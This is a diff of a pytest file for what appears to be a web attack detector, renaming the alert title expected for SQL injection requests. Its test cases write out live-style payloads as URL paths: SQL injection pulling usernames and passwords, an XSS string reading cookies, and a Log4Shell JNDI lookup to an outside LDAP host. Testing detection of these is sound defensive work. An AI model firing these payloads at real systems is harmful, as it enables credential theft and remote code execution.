@@ -53,9 +53,9 @@ def test_url_decode():
 
 
 @pytest.mark.parametrize("path,title", [
-    ("/search?q=1%27%20UNION%20SELECT%20username,password%20FROM%20users--", "SQL Injection Attempt"),
-    ("/item?id=1+union+all+select+null,version()--", "SQL Injection Attempt"),
-    ("/p?id=1%20AND%20SLEEP(5)", "SQL Injection Attempt"),
+    ("/search?q=1%27%20UNION%20SELECT%20username,password%20FROM%20users--", "SQL Injection In A Web Request"),
+    ("/item?id=1+union+all+select+null,version()--", "SQL Injection In A Web Request"),
+    ("/p?id=1%20AND%20SLEEP(5)", "SQL Injection In A Web Request"),
     ("/q?name=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E", "Cross-Site Scripting (XSS) Attempt"),
     ("/x?u=%24%7Bjndi%3Aldap%3A%2F%2F45.9.20.1%2Fa%7D", "Log4Shell Exploitation Attempt (CVE-2021-44228)"),
 ])
